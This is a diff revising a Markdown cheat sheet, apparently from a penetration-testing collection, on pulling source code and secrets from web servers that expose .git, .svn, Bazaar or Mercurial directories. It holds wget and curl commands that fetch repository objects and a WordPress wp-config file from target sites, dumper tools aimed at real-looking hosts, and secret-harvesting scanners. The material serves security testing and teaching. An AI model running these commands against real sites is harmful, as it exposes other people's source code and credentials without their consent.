@@ -1,25 +1,35 @@
 # Insecure source code management
 
-- [GIT - Source code management](#git---source-code-management)
-  - [Github example with a .git](#github-example-with-a-git)
-  - [Recovering the content of .git/index](#recovering-the-content-of-gitindex)
-  - [Automatic way : diggit.py](#automatic-way--diggitpy)
-  - [Automatic way : GoGitDumper](#automatic-way-gogitdumper)
-  - [Automatic way : rip-git](#automatic-way--rip-git)
-  - [Automatic way : GitHack](#automatic-way--githack)
-  - [Harvesting secrets : trufflehog](#harvesting-secrets--trufflehog)
-  - [Harvesting secrets : Gitrob](#harvesting-secrets--gitrob)
-  - [Harvesting secrets : Gitleaks](#harvesting-secrets--gitleaks)
-- [SVN - Source code management](#svn---source-code-management)
-  - [SVN example (Wordpress)](#svn-example-wordpress)
-  - [Automatic way : svn-extractor](#automatic-way--svn-extractor)
-- [BAZAAR - Source code management](#bazaar---source-code-management)
-  - [Automatic way : rip-bzr](#automatic-way--rip-bzr)
-  - [Automatic way : bzr_dumper](#automatic-way--bzr_dumper)
-- [MERCURIAL - Source code management](#mercurial---source-code-management)
-  - [Automatic way : rip-hg](#automatic-way--rip-hg)
+* [Git](#git)
+  + [Example](#example)
+    - [Recovering file contents from .git/logs/HEAD](#recovering-file-contents-from-gitlogshead)
+    - [Recovering file contents from .git/index](#recovering-file-contents-from-gitindex)
+  + [Tools](#tools)
+    - [Automatic recovery](#automatic-recovery)
+      * [diggit.py](#diggitpy)
+      * [GoGitDumper](#gogitdumper)
+      * [rip-git](#rip-git)
+      * [GitHack](#githack)
+      * [GitTools](#gittools)
+    - [Harvesting secrets](#harvesting-secrets)
+      * [trufflehog](#trufflehog)
+      * [Yar](#yar)
+      * [Gitrob](#gitrob)
+      * [Gitleaks](#gitleaks)
+* [Subversion](#subversion)
+  + [Example (Wordpress)](#example-wordpress)
+  + [Tools](#tools-1)
+    - [svn-extractor](#svn-extractor)
+* [Bazaar](#bazaar)
+  + [Tools](#tools-2)
+    - [rip-bzr.pl](#rip-bzrpl)
+    - [bzr_dumper](#bzr_dumper)
+* [Mercurial](#mercurial)
+  + [Tools](#tools-3)
+    - [rip-hg.pl](#rip-hgpl)
+* [References](#references)
 
-## GIT - Source code management
+## Git
 
 The following examples will create either a copy of the .git or a copy of the current commit.
 
@@ -29,28 +39,32 @@ Check for the following files, if they exist you can extract the .git folder.
 - .git/HEAD
 - .git/logs/HEAD
 
-### Github example with a .git
+### Example
 
-1. Check 403 error (Forbidden) for .git or even better : a directory listing
-2. Git saves all information in log file .git/logs/HEAD (try 'head' in lowercase too)
+#### Recovering file contents from .git/logs/HEAD
+
+1. Check for 403 Forbidden or directory listing to find the `/.git/` directory
+2. Git saves all information in `.git/logs/HEAD` (try lowercase `head` too)
     ```powershell
     0000000000000000000000000000000000000000 15ca375e54f056a576905b41a417b413c57df6eb root <root@dfc2eabdf236.(none)> 1455532500 +0000        clone: from https://github.com/fermayo/hello-world-lamp.git
     15ca375e54f056a576905b41a417b413c57df6eb 26e35470d38c4d6815bc4426a862d5399f04865c Michael <michael@easyctf.com> 1489390329 +0000        commit: Initial.
     26e35470d38c4d6815bc4426a862d5399f04865c 6b4131bb3b84e9446218359414d636bda782d097 Michael <michael@easyctf.com> 1489390330 +0000        commit: Whoops! Remove flag.
     6b4131bb3b84e9446218359414d636bda782d097 a48ee6d6ca840b9130fbaa73bbf55e9e730e4cfd Michael <michael@easyctf.com> 1489390332 +0000        commit: Prevent directory listing.
     ```
-3. Access to the commit based on the hash -> a directory name (first two signs from hash) and filename (rest of it).git/objects/26/e35470d38c4d6815bc4426a862d5399f04865c,
+3. Access the commit using the hash
     ```powershell
-    # create a .git directory
+    # create an empty .git repository
     git init test
     cd test/.git
 
     # download the file
-    wget http://xxx.web.xxx.com/.git/objects/26/e35470d38c4d6815bc4426a862d5399f04865c
+    wget http://web.site/.git/objects/26/e35470d38c4d6815bc4426a862d5399f04865c
+
+    # first byte for subdirectory, remaining bytes for filename
     mkdir .git/object/26
     mv e35470d38c4d6815bc4426a862d5399f04865c .git/objects/26/
 
-    # display the content of the file
+    # display the file
     git cat-file -p 26e35470d38c4d6815bc4426a862d5399f04865c
         tree 323240a3983045cdc0dec2e88c1358e7998f2e39
         parent 15ca375e54f056a576905b41a417b413c57df6eb
@@ -60,7 +74,7 @@ Check for the following files, if they exist you can extract the .git folder.
     ```
 4. Access the tree 323240a3983045cdc0dec2e88c1358e7998f2e39
     ```powershell
-    wget http://xxx.web.xxx.com/.git/objects/32/3240a3983045cdc0dec2e88c1358e7998f2e39
+    wget http://web.site/.git/objects/32/3240a3983045cdc0dec2e88c1358e7998f2e39
     mkdir .git/object/32
     mv 3240a3983045cdc0dec2e88c1358e7998f2e39 .git/objects/32/
 
@@ -73,22 +87,22 @@ Check for the following files, if they exist you can extract the .git folder.
     ```
 5. Read the data (flag.txt)
     ```powershell
-    wget http://xxx.web.xxx.com/.git/objects/cb/6139863967a752f3402b3975e97a84d152fd8f
+    wget http://web.site/.git/objects/cb/6139863967a752f3402b3975e97a84d152fd8f
     mkdir .git/object/cb
     mv 6139863967a752f3402b3975e97a84d152fd8f .git/objects/32/
     git cat-file -p cb6139863967a752f3402b3975e97a84d152fd8f
     ```
 
-### Recovering the content of .git/index
+#### Recovering file contents from .git/index
 
-Use the git index file parser, using python3 https://pypi.python.org/pypi/gin
+Use the git index file parser https://pypi.python.org/pypi/gin (python3).
 
 ```powershell
 pip3 install gin
 gin ~/git-repo/.git/index
 ```
 
-Recover name and sha1 hash for each files listed in the index, allowing us to re-use the previous method on the file.
+Recover name and sha1 hash of every file listed in the index, and use the same process above to recover the file.
 
 ```powershell
 $ gin .git/index | egrep -e "name|sha1" 
@@ -99,9 +113,11 @@ name = CRLF injection/README.md
 sha1 = d7ef4d77741c38b6d3806e0c6a57bf1090eec141
 ```
  
+### Tools
 
+#### Automatic recovery
 
-### Automatic way : diggit.py
+##### diggit.py
 
 ```powershell
 ./diggit.py -u remote_git_repo -t temp_folder -o object_hash [-r=True]
@@ -112,7 +128,7 @@ sha1 = d7ef4d77741c38b6d3806e0c6a57bf1090eec141
 -o is a hash of particular Git object to download
 ```
 
-### Automatic way : GoGitDumper
+##### GoGitDumper
 
 ```powershell
 go get github.com/c-sto/gogitdumper
@@ -121,11 +137,11 @@ git log
 git checkout
 ```
 
-### Automatic way : rip-git
+##### rip-git
 
 ```powershell
 git clone https://github.com/kost/dvcs-ripper
-perl rip-git.pl -v -u "http://edge1.web.*****.com/.git/"
+perl rip-git.pl -v -u "http://web.site/.git/"
 
 git cat-file -p 07603070376d63d911f608120eb4b5489b507692  
 tree 5dae937a49acc7c2668f5bcde2a9fd07fc382fe2
@@ -136,14 +152,14 @@ committer Michael <michael@easyctf.com> 1489389105 +0000
 git cat-file -p 5dae937a49acc7c2668f5bcde2a9fd07fc382fe2
 ```
 
-### Automatic way : GitHack
+##### GitHack
 
 ```powershell
 git clone https://github.com/lijiejie/GitHack
 GitHack.py http://www.openssl.org/.git/
 ```
 
-### Automatic way: GitTools
+##### GitTools
 
 ```powershell
 git clone https://github.com/internetwache/GitTools
@@ -151,16 +167,27 @@ git clone https://github.com/internetwache/GitTools
 git checkout -- .
 ```
 
-### Harvesting secrets : trufflehog
+#### Harvesting secrets
 
-> Searches through git repositories for high entropy strings and secrets, digging deep into commit history
+##### trufflehog
+
+> Searches through git repositories for high entropy strings and secrets, digging deep into commit history.
 
 ```powershell
 pip install truffleHog # https://github.com/dxa4481/truffleHog
 truffleHog --regex --entropy=False https://github.com/dxa4481/truffleHog.git
 ```
 
-### Harvesting secrets : Gitrob
+##### Yar
+
+> Searches through users/organizations git repositories for secrets either by regex, entropy or both. Inspired by the infamous truffleHog.
+
+```powershell
+go get github.com/nielsing/yar # https://github.com/nielsing/yar
+yar -o orgname --both
+```
+
+##### Gitrob
 
 > Gitrob is a tool to help find potentially sensitive files pushed to public repositories on Github. Gitrob will clone repositories belonging to a user or organization down to a configurable depth and iterate through the commit history and flag files that match signatures for potentially sensitive files.
 
@@ -170,13 +197,13 @@ export GITROB_ACCESS_TOKEN=deadbeefdeadbeefdeadbeefdeadbeefdeadbeef
 gitrob [options] target [target2] ... [targetN]
 ```
 
-### Harvesting secrets - Gitleaks
+##### Gitleaks
 
 > Gitleaks provides a way for you to find unencrypted secrets and other unwanted data types in git source code repositories.
 
 ```powershell
 # Run gitleaks against a public repository
-docker run --rm --name=gitleaks zricethezav/gitleaks -v -r  https://github.com/zricethezav/gitleaks.git
+docker run --rm --name=gitleaks zricethezav/gitleaks -v -r https://github.com/zricethezav/gitleaks.git
 
 # Run gitleaks against a local repository already cloned into /tmp/
 docker run --rm --name=gitleaks -v /tmp/:/code/  zricethezav/gitleaks -v --repo-path=/code/gitleaks
@@ -189,9 +216,9 @@ or
 go get -u github.com/zricethezav/gitleaks
 ```
 
-## SVN - Source code management
+## Subversion
 
-### SVN example (Wordpress)
+### Example (Wordpress)
 
 ```powershell
 curl http://blog.domain.com/.svn/text-base/wp-config.php.svn-base
@@ -204,26 +231,30 @@ curl http://blog.domain.com/.svn/text-base/wp-config.php.svn-base
 2. Download interesting files
     * remove \$sha1\$ prefix
     * add .svn-base postfix
-    * use first two signs from hash as folder name inside pristine/ directory (94 in this case)
+    * use first byte from hash as a subdirectory of the `pristine/` directory (`94` in this case)
     * create complete path, which will be: `http://server/path_to_vulnerable_site/.svn/pristine/94/945a60e68acc693fcb74abadb588aac1a9135f62.svn-base`
 
-### Automatic way : svn-extractor
+### Tools
+
+#### svn-extractor
 
 ```powershell
 git clone https://github.com/anantshri/svn-extractor.git
 python svn-extractor.py –url "url with .svn available"
 ```
 
-## BAZAAR - Source code management
+## Bazaar
 
-### Automatic way : rip-bzr.pl
+### Tools
+
+#### rip-bzr.pl
 
 ```powershell
 wget https://raw.githubusercontent.com/kost/dvcs-ripper/master/rip-bzr.pl
 docker run --rm -it -v /path/to/host/work:/work:rw k0st/alpine-dvcs-ripper rip-bzr.pl -v -u
 ```
 
-### Automatic way : bzr_dumper
+#### bzr_dumper
 
 ```powershell
 git clone https://github.com/SeahunOh/bzr_dumper
@@ -248,9 +279,11 @@ $ bzr revert
  N  static/   
 ```
 
-## MERCURIAL - Source code management
+## Mercurial
 
-### Automatic way : rip-hg.pl
+### Tools
+
+#### rip-hg.pl
 
 ```powershell
 wget https://raw.githubusercontent.com/kost/dvcs-ripper/master/rip-hg.pl
